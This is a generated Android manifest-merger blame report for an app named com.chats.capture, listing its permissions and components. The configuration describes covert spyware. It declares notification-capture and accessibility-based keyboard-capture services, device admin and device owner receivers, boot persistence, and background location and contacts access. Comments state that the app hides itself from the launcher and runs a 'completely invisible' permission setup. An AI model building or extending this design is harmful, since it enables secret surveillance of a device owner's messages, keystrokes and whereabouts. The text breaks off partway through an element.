app/build/intermediates/manifest_merge_blame_file/debug/processDebugMainManifest/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.chats.capture"
4    android:versionCode="1"
5    android:versionName="1.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="26"
9        android:targetSdkVersion="34" />
10
11    <!-- Permissions -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
14-->src/main/AndroidManifest.xml:8:5-76
14-->src/main/AndroidManifest.xml:8:22-73
15    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
15-->src/main/AndroidManifest.xml:9:5-77
15-->src/main/AndroidManifest.xml:9:22-74
16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
16-->src/main/AndroidManifest.xml:10:5-77
16-->src/main/AndroidManifest.xml:10:22-74
17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
17-->src/main/AndroidManifest.xml:11:5-87
17-->src/main/AndroidManifest.xml:11:22-84
18    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
18-->src/main/AndroidManifest.xml:12:5-95
18-->src/main/AndroidManifest.xml:12:22-92
19    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
19-->src/main/AndroidManifest.xml:13:5-81
19-->src/main/AndroidManifest.xml:13:22-78
20    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
20-->src/main/AndroidManifest.xml:14:5-83
20-->src/main/AndroidManifest.xml:14:22-80
21    <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />
21-->src/main/AndroidManifest.xml:15:5-88
21-->src/main/AndroidManifest.xml:15:22-85
22    <uses-permission
22-->src/main/AndroidManifest.xml:16:5-17:38
23        android:name="android.permission.READ_EXTERNAL_STORAGE"
23-->src/main/AndroidManifest.xml:16:22-77
24        android:maxSdkVersion="32" />
24-->src/main/AndroidManifest.xml:17:9-35
25    <uses-permission
25-->src/main/AndroidManifest.xml:18:5-19:38
26        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
26-->src/main/AndroidManifest.xml:18:22-78
27        android:maxSdkVersion="32" />
27-->src/main/AndroidManifest.xml:19:9-35
28    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
28-->src/main/AndroidManifest.xml:20:5-76
28-->src/main/AndroidManifest.xml:20:22-73
29    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
29-->src/main/AndroidManifest.xml:21:5-75
29-->src/main/AndroidManifest.xml:21:22-72
30    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
30-->src/main/AndroidManifest.xml:22:5-114
30-->src/main/AndroidManifest.xml:22:22-75
31    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
31-->src/main/AndroidManifest.xml:23:5-77
31-->src/main/AndroidManifest.xml:23:22-74
32    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
32-->src/main/AndroidManifest.xml:24:5-76
32-->src/main/AndroidManifest.xml:24:22-73
33    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
33-->src/main/AndroidManifest.xml:25:5-79
33-->src/main/AndroidManifest.xml:25:22-76
34    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
34-->src/main/AndroidManifest.xml:26:5-81
34-->src/main/AndroidManifest.xml:26:22-78
35    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
35-->src/main/AndroidManifest.xml:27:5-85
35-->src/main/AndroidManifest.xml:27:22-82
36    <uses-permission android:name="android.permission.READ_CONTACTS" />
36-->src/main/AndroidManifest.xml:28:5-72
36-->src/main/AndroidManifest.xml:28:22-69
37    <uses-permission android:name="android.permission.WAKE_LOCK" /> <!-- Required by older versions of Google Play services to create IID tokens -->
37-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:24:5-68
37-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:24:22-65
38    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
38-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:26:5-82
38-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:26:22-79
39
40    <permission
40-->[androidx.core:core:1.13.1] AndroidManifest.xml:22:5-24:47
41        android:name="com.chats.capture.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
41-->[androidx.core:core:1.13.1] AndroidManifest.xml:23:9-81
42        android:protectionLevel="signature" />
42-->[androidx.core:core:1.13.1] AndroidManifest.xml:24:9-44
43
44    <uses-permission android:name="com.chats.capture.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
44-->[androidx.core:core:1.13.1] AndroidManifest.xml:26:5-97
44-->[androidx.core:core:1.13.1] AndroidManifest.xml:26:22-94
45
46    <application
46-->src/main/AndroidManifest.xml:30:5-221:19
47        android:name="com.chats.capture.CaptureApplication"
47-->src/main/AndroidManifest.xml:31:9-43
48        android:allowBackup="true"
48-->src/main/AndroidManifest.xml:32:9-35
49        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
49-->[androidx.core:core:1.13.1] AndroidManifest.xml:28:18-86
50        android:dataExtractionRules="@xml/data_extraction_rules"
50-->src/main/AndroidManifest.xml:33:9-65
51        android:debuggable="true"
52        android:extractNativeLibs="false"
53        android:fullBackupContent="@xml/backup_rules"
53-->src/main/AndroidManifest.xml:34:9-54
54        android:icon="@mipmap/ic_launcher"
54-->src/main/AndroidManifest.xml:35:9-43
55        android:label="@string/app_name"
55-->src/main/AndroidManifest.xml:36:9-41
56        android:networkSecurityConfig="@xml/network_security_config"
56-->src/main/AndroidManifest.xml:41:9-69
57        android:roundIcon="@mipmap/ic_launcher_round"
57-->src/main/AndroidManifest.xml:37:9-54
58        android:supportsRtl="true"
58-->src/main/AndroidManifest.xml:38:9-35
59        android:theme="@style/Theme.ChatCapture"
59-->src/main/AndroidManifest.xml:39:9-49
60        android:usesCleartextTraffic="true" >
60-->src/main/AndroidManifest.xml:40:9-44
61
62        <!-- Main Activity (Hidden from Launcher, finishes immediately) -->
63        <activity
63-->src/main/AndroidManifest.xml:45:9-55:20
64            android:name="com.chats.capture.ui.MainActivity"
64-->src/main/AndroidManifest.xml:46:13-44
65            android:enabled="true"
65-->src/main/AndroidManifest.xml:49:13-35
66            android:excludeFromRecents="true"
66-->src/main/AndroidManifest.xml:50:13-46
67            android:exported="false"
67-->src/main/AndroidManifest.xml:47:13-37
68            android:noHistory="true"
68-->src/main/AndroidManifest.xml:51:13-37
69            android:theme="@style/Theme.ChatCapture" >
69-->src/main/AndroidManifest.xml:48:13-53
70
71            <!-- Removed LAUNCHER category to hide from app drawer -->
72            <!-- Accessible only via Settings or direct intent -->
73            <!-- Will finish immediately without showing UI -->
74        </activity>
75
76        <!-- Settings Launcher Activity (Only accessible via Settings app, NOT in launcher) -->
77        <!-- LAUNCHER category added for Android Studio debugging - will be hidden at runtime -->
78        <activity
78-->src/main/AndroidManifest.xml:59:9-70:20
79            android:name="com.chats.capture.ui.SettingsLauncherActivity"
79-->src/main/AndroidManifest.xml:60:13-73
80            android:excludeFromRecents="true"
80-->src/main/AndroidManifest.xml:63:13-46
81            android:exported="true"
81-->src/main/AndroidManifest.xml:61:13-36
82            android:theme="@style/Theme.ChatCapture" >
82-->src/main/AndroidManifest.xml:62:13-53
83
84            <!-- LAUNCHER category needed for Android Studio to launch app -->
85            <!-- App will be hidden from launcher at runtime via AppVisibilityManager -->
86            <intent-filter>
86-->src/main/AndroidManifest.xml:66:13-69:29
87                <action android:name="android.intent.action.MAIN" />
87-->src/main/AndroidManifest.xml:67:17-69
87-->src/main/AndroidManifest.xml:67:25-66
88
89                <category android:name="android.intent.category.LAUNCHER" />
89-->src/main/AndroidManifest.xml:68:17-77
89-->src/main/AndroidManifest.xml:68:27-74
90            </intent-filter>
91        </activity>
92
93        <!-- Update Permission Activity -->
94        <activity
94-->src/main/AndroidManifest.xml:73:9-76:56
95            android:name="com.chats.capture.ui.UpdatePermissionActivity"
95-->src/main/AndroidManifest.xml:74:13-56
96            android:exported="false"
96-->src/main/AndroidManifest.xml:75:13-37
97            android:theme="@style/Theme.ChatCapture" />
97-->src/main/AndroidManifest.xml:76:13-53
98
99        <!-- Permission Setup Activity (Auto-start, completely invisible) -->
100        <activity
100-->src/main/AndroidManifest.xml:79:9-89:20
101            android:name="com.chats.capture.ui.PermissionSetupActivity"
101-->src/main/AndroidManifest.xml:80:13-55
102            android:excludeFromRecents="true"
102-->src/main/AndroidManifest.xml:85:13-46
103            android:exported="true"
103-->src/main/AndroidManifest.xml:81:13-36
104            android:finishOnTaskLaunch="true"
104-->src/main/AndroidManifest.xml:87:13-46
105            android:launchMode="singleTask"
105-->src/main/AndroidManifest.xml:83:13-44
106            android:noHistory="true"
106-->src/main/AndroidManifest.xml:86:13-37
107            android:taskAffinity=""
107-->src/main/AndroidManifest.xml:84:13-36
108            android:theme="@style/Theme.ChatCapture.Translucent" >
108-->src/main/AndroidManifest.xml:82:13-65
109
110            <!-- No intent filter - only launched programmatically -->
111        </activity>
112
113        <!-- Settings Shortcut Activity (Accessible from Settings, finishes immediately) -->
114        <activity
114-->src/main/AndroidManifest.xml:92:9-103:20
115            android:name="com.chats.capture.ui.SettingsShortcutActivity"
115-->src/main/AndroidManifest.xml:93:13-56
116            android:excludeFromRecents="true"
116-->src/main/AndroidManifest.xml:97:13-46
117            android:exported="true"
117-->src/main/AndroidManifest.xml:94:13-36
118            android:label="@string/app_name"
118-->src/main/AndroidManifest.xml:96:13-45
119            android:noHistory="true"
119-->src/main/AndroidManifest.xml:98:13-37
120            android:theme="@style/Theme.ChatCapture" >
120-->src/main/AndroidManifest.xml:95:13-53
121            <intent-filter>
121-->src/main/AndroidManifest.xml:99:13-102:29
122                <action android:name="android.intent.action.APPLICATION_PREFERENCES" />
122-->src/main/AndroidManifest.xml:100:17-88
122-->src/main/AndroidManifest.xml:100:25-85
123
124                <category android:name="android.intent.category.DEFAULT" />
124-->src/main/AndroidManifest.xml:101:17-76
124-->src/main/AndroidManifest.xml:101:27-73
125            </intent-filter>
126        </activity>
127
128        <!-- Update Install Receiver -->
129        <receiver
129-->src/main/AndroidManifest.xml:106:9-108:40
130            android:name="com.chats.capture.updates.UpdateInstallReceiver"
130-->src/main/AndroidManifest.xml:107:13-58
131            android:exported="false" />
131-->src/main/AndroidManifest.xml:108:13-37
132
133        <!-- Package Install Receiver -->
134        <receiver
134-->src/main/AndroidManifest.xml:111:9-121:20
135            android:name="com.chats.capture.receivers.PackageInstallReceiver"
135-->src/main/AndroidManifest.xml:112:13-61
136            android:enabled="true"
136-->src/main/AndroidManifest.xml:113:13-35
137            android:exported="true" >
137-->src/main/AndroidManifest.xml:114:13-36
138            <intent-filter>
138-->src/main/AndroidManifest.xml:115:13-120:29
139                <action android:name="android.intent.action.PACKAGE_ADDED" />
139-->src/main/AndroidManifest.xml:116:17-78
139-->src/main/AndroidManifest.xml:116:25-75
140                <action android:name="android.intent.action.PACKAGE_REPLACED" />
140-->src/main/AndroidManifest.xml:117:17-81
140-->src/main/AndroidManifest.xml:117:25-78
141                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
141-->src/main/AndroidManifest.xml:118:17-84
141-->src/main/AndroidManifest.xml:118:25-81
142
143                <data android:scheme="package" />
143-->src/main/AndroidManifest.xml:119:17-50
143-->src/main/AndroidManifest.xml:119:23-47
144            </intent-filter>
145        </receiver>
146
147        <!-- Device Admin Receiver -->
148        <receiver
148-->src/main/AndroidManifest.xml:124:9-134:20
149            android:name="com.chats.capture.mdm.DeviceAdminReceiver"
149-->src/main/AndroidManifest.xml:125:13-52
150            android:exported="true"
150-->src/main/AndroidManifest.xml:127:13-36
151            android:permission="android.permission.BIND_DEVICE_ADMIN" >
151-->src/main/AndroidManifest.xml:126:13-70
152            <meta-data
152-->src/main/AndroidManifest.xml:128:13-130:56
153                android:name="android.app.device_admin"
153-->src/main/AndroidManifest.xml:129:17-56
154                android:resource="@xml/device_admin" />
154-->src/main/AndroidManifest.xml:130:17-53
155
156            <intent-filter>
156-->src/main/AndroidManifest.xml:131:13-133:29
157                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
157-->src/main/AndroidManifest.xml:132:17-82
157-->src/main/AndroidManifest.xml:132:25-79
158            </intent-filter>
159        </receiver>
160
161        <!-- Device Owner Receiver -->
162        <receiver
162-->src/main/AndroidManifest.xml:137:9-147:20
163            android:name="com.chats.capture.mdm.DeviceOwnerReceiver"
163-->src/main/AndroidManifest.xml:138:13-52
164            android:exported="true"
164-->src/main/AndroidManifest.xml:140:13-36
165            android:permission="android.permission.BIND_DEVICE_ADMIN" >
165-->src/main/AndroidManifest.xml:139:13-70
166            <meta-data
166-->src/main/AndroidManifest.xml:128:13-130:56
167                android:name="android.app.device_admin"
167-->src/main/AndroidManifest.xml:129:17-56
168                android:resource="@xml/device_admin" />
168-->src/main/AndroidManifest.xml:130:17-53
169
170            <intent-filter>
170-->src/main/AndroidManifest.xml:131:13-133:29
171                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
171-->src/main/AndroidManifest.xml:132:17-82
171-->src/main/AndroidManifest.xml:132:25-79
172            </intent-filter>
173        </receiver>
174
175        <!-- Notification Capture Service -->
176        <service
176-->src/main/AndroidManifest.xml:150:9-158:19
177            android:name="com.chats.capture.services.NotificationCaptureService"
177-->src/main/AndroidManifest.xml:151:13-64
178            android:exported="true"
178-->src/main/AndroidManifest.xml:152:13-36
179            android:foregroundServiceType="dataSync"
179-->src/main/AndroidManifest.xml:153:13-53
180            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
180-->src/main/AndroidManifest.xml:154:13-87
181            <intent-filter>
181-->src/main/AndroidManifest.xml:155:13-157:29
182                <action android:name="android.service.notification.NotificationListenerService" />
182-->src/main/AndroidManifest.xml:156:17-99
182-->src/main/AndroidManifest.xml:156:25-96
183            </intent-filter>
184        </service>
185
186        <!-- Keyboard Capture Service (Accessibility) -->
187        <service
187-->src/main/AndroidManifest.xml:161:9-172:19
188            android:name="com.chats.capture.services.KeyboardCaptureService"
188-->src/main/AndroidManifest.xml:162:13-60
189            android:exported="true"
189-->src/main/AndroidManifest.xml:163:13-36
190            android:foregroundServiceType="dataSync"
190-->src/main/AndroidManifest.xml:164:13-53
191            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
191-->src/main/AndroidManifest.xml:165:13-79
192            <intent-filter>
192-->src/main/AndroidManifest.xml:166:13-168:29
193                <action android:name="android.accessibilityservice.AccessibilityService" />
193-->src/main/AndroidManifest.xml:167:17-92
193-->src/main/AndroidManifest.xml:167:25-89
194            </intent-filter>
195
196            <meta-data
196-->src/main/AndroidManifest.xml:169:13-171:72
197                android:name="android.accessibilityservice"
197-->src/main/AndroidManifest.xml:170:17-60
198                android:resource="@xml/accessibility_service_config" />
198-->src/main/AndroidManifest.xml:171:17-69
199        </service>
200
201        <!-- Enhanced Accessibility Service -->
202        <service
202-->src/main/AndroidManifest.xml:175:9-186:19
203            android:name="com.chats.capture.services.EnhancedAccessibilityService"
203-->src/main/AndroidManifest.xml:176:13-66
204            android:exported="true"
204-->src/main/AndroidManifest.xml:177:13-36
205            android:foregroundServiceType="dataSync"
205-->src/main/AndroidManifest.xml:178:13-53
206            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
206-->src/main/AndroidManifest.xml:179:13-79
207            <intent-filter>
207-->src/main/AndroidManifest.xml:166:13-168:29
208                <action android:name="android.accessibilityservice.AccessibilityService" />
208-->src/main/AndroidManifest.xml:167:17-92
208-->src/main/AndroidManifest.xml:167:25-89
209            </intent-filter>
210
211            <meta-data
211-->src/main/AndroidManifest.xml:169:13-171:72
212                android:name="android.accessibilityservice"
212-->src/main/AndroidManifest.xml:170:17-60
213                android:resource="@xml/accessibility_service_config" />
213-->src/main/AndroidManifest.xml:171:17-69
214        </service>
215
216        <!-- Firebase Cloud Messaging Service -->
217        <service
217-->src/main/AndroidManifest.xml:189:9-195:19
218            android:name="com.chats.capture.services.AppFirebaseMessagingService"
218-->src/main/AndroidManifest.xml:190:13-65
219            android:exported="false" >
219-->src/main/AndroidManifest.xml:191:13-37
220            <intent-filter>
220-->src/main/AndroidManifest.xml:192:13-194:29
221                <action android:name="com.google.firebase.MESSAGING_EVENT" />
221-->src/main/AndroidManifest.xml:193:17-78
221-->src/main/AndroidManifest.xml:193:25-75
222            </intent-filter>
223        </service>
224
225        <!-- Boot Receiver -->
226        <receiver
226-->src/main/AndroidManifest.xml:198:9-208:20
227            android:name="com.chats.capture.receivers.BootReceiver"
227-->src/main/AndroidManifest.xml:199:13-51
228            android:enabled="true"
228-->src/main/AndroidManifest.xml:200:13-35
229            android:exported="true"
229-->src/main/AndroidManifest.xml:201:13-36
230            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
230-->src/main/AndroidManifest.xml:202:13-75
231            <intent-filter>
231-->src/main/AndroidManifest.xml:203:13-207:29
232                <action android:name="android.intent.action.BOOT_COMPLETED" />
232-->src/main/AndroidManifest.xml:204:17-79
232-->src/main/AndroidManifest.xml:204:25-76
233                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
233-->src/main/AndroidManifest.xml:205:17-82
233-->src/main/AndroidManifest.xml:205:25-79
234
235                <category android:name="android.intent.category.DEFAULT" />
235-->src/main/AndroidManifest.xml:101:17-76
235-->src/main/AndroidManifest.xml:101:27-73
236            </intent-filter>
237        </receiver>
238
239        <!-- FileProvider for secure file access -->
240        <provider
241            android:name="androidx.core.content.FileProvider"
241-->src/main/AndroidManifest.xml:212:13-62
242            android:authorities="com.chats.capture.fileprovider"
242-->src/main/AndroidManifest.xml:213:13-64
243            android:exported="false"
243-->src/main/AndroidManifest.xml:214:13-37
244            android:grantUriPermissions="true" >
244-->src/main/AndroidManifest.xml:215:13-47
245            <meta-data
245-->src/main/AndroidManifest.xml:216:13-218:63
246                android:name="android.support.FILE_PROVIDER_PATHS"
246-->src/main/AndroidManifest.xml:217:17-67
247                android:resource="@xml/file_provider_paths" />
247-->src/main/AndroidManifest.xml:218:17-60
248        </provider>
249        <provider
249-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
250            android:name="androidx.startup.InitializationProvider"
250-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
251            android:authorities="com.chats.capture.androidx-startup"
251-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
252            android:exported="false" >
252-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
253            <meta-data
253-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
254                android:name="androidx.emoji2.text.EmojiCompatInitializer"
254-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
255                android:value="androidx.startup" />
255-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
256            <meta-data
256-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
257                android:name="androidx.work.WorkManagerInitializer"
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
258                android:value="androidx.startup" />
258-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
259            <meta-data
259-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:29:13-31:52
260                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
260-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:30:17-78
261                android:value="androidx.startup" />
261-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:31:17-49
262            <meta-data
262-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:29:13-31:52
263                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
263-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:30:17-85
264                android:value="androidx.startup" />
264-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:31:17-49
265        </provider>
266
267        <receiver
267-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:29:9-40:20
268            android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver"
268-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:30:13-78
269            android:exported="true"
269-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:31:13-36
270            android:permission="com.google.android.c2dm.permission.SEND" >
270-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:32:13-73
271            <intent-filter>
271-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:33:13-35:29
272                <action android:name="com.google.android.c2dm.intent.RECEIVE" />
272-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:34:17-81
272-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:34:25-78
273            </intent-filter>
274
275            <meta-data
275-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:37:13-39:40
276                android:name="com.google.android.gms.cloudmessaging.FINISHED_AFTER_HANDLED"
276-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:38:17-92
277                android:value="true" />
277-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:39:17-37
278        </receiver>
279        <!--
280             FirebaseMessagingService performs security checks at runtime,
281             but set to not exported to explicitly avoid allowing another app to call it.
282        -->
283        <service
283-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:46:9-53:19
284            android:name="com.google.firebase.messaging.FirebaseMessagingService"
284-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:47:13-82
285            android:directBootAware="true"
285-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:48:13-43
286            android:exported="false" >
286-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:49:13-37
287            <intent-filter android:priority="-500" >
287-->src/main/AndroidManifest.xml:192:13-194:29
288                <action android:name="com.google.firebase.MESSAGING_EVENT" />
288-->src/main/AndroidManifest.xml:193:17-78
288-->src/main/AndroidManifest.xml:193:25-75
289            </intent-filter>
290        </service>
291        <service
291-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:54:9-63:19
292            android:name="com.google.firebase.components.ComponentDiscoveryService"
292-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:55:13-84
293            android:directBootAware="true"
293-->[com.google.firebase:firebase-common:20.4.2] AndroidManifest.xml:32:13-43
294            android:exported="false" >
294-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:56:13-37
295            <meta-data
295-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:57:13-59:85
296                android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingKtxRegistrar"
296-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:58:17-122
297                android:value="com.google.firebase.components.ComponentRegistrar" />
297-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:59:17-82
298            <meta-data
298-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:60:13-62:85
299                android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar"
299-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:61:17-119
300                android:value="com.google.firebase.components.ComponentRegistrar" />
300-->[com.google.firebase:firebase-messaging:23.4.0] AndroidManifest.xml:62:17-82
301            <meta-data
301-->[com.google.firebase:firebase-installations:17.2.0] AndroidManifest.xml:15:13-17:85
302                android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsKtxRegistrar"
302-->[com.google.firebase:firebase-installations:17.2.0] AndroidManifest.xml:16:17-130
303                android:value="com.google.firebase.components.ComponentRegistrar" />
303-->[com.google.firebase:firebase-installations:17.2.0] AndroidManifest.xml:17:17-82
304            <meta-data
304-->[com.google.firebase:firebase-installations:17.2.0] AndroidManifest.xml:18:13-20:85
305                android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar"
305-->[com.google.firebase:firebase-installations:17.2.0] AndroidManifest.xml:19:17-127
306                android:value="com.google.firebase.components.ComponentRegistrar" />
306-->[com.google.firebase:firebase-installations:17.2.0] AndroidManifest.xml:20:17-82
307            <meta-data
307-->[com.google.firebase:firebase-common-ktx:20.4.2] AndroidManifest.xml:12:13-14:85
308                android:name="com.google.firebase.components:com.google.firebase.ktx.FirebaseCommonLegacyRegistrar"
308-->[com.google.firebase:firebase-common-ktx:20.4.2] AndroidManifest.xml:13:17-116
309                android:value="com.google.firebase.components.ComponentRegistrar" />
309-->[com.google.firebase:firebase-common-ktx:20.4.2] AndroidManifest.xml:14:17-82
310            <meta-data
310-->[com.google.firebase:firebase-common:20.4.2] AndroidManifest.xml:35:13-37:85
311                android:name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar"
311-->[com.google.firebase:firebase-common:20.4.2] AndroidManifest.xml:36:17-109
312                android:value="com.google.firebase.components.ComponentRegistrar" />
312-->[com.google.firebase:firebase-common:20.4.2] AndroidManifest.xml:37:17-82
313            <meta-data
313-->[com.google.firebase:firebase-datatransport:18.1.7] AndroidManifest.xml:27:13-29:85
314                android:name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar"
314-->[com.google.firebase:firebase-datatransport:18.1.7] AndroidManifest.xml:28:17-115
315                android:value="com.google.firebase.components.ComponentRegistrar" />
315-->[com.google.firebase:firebase-datatransport:18.1.7] AndroidManifest.xml:29:17-82
316        </service>
317
318        <activity
318-->[com.google.android.gms:play-services-base:18.0.1] AndroidManifest.xml:20:9-22:45
319            android:name="com.google.android.gms.common.api.GoogleApiActivity"
319-->[com.google.android.gms:play-services-base:18.0.1] AndroidManifest.xml:20:19-85
320            android:exported="false"
320-->[com.google.android.gms:play-services-base:18.0.1] AndroidManifest.xml:22:19-43
321            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
321-->[com.google.android.gms:play-services-base:18.0.1] AndroidManifest.xml:21:19-78
322
323        <provider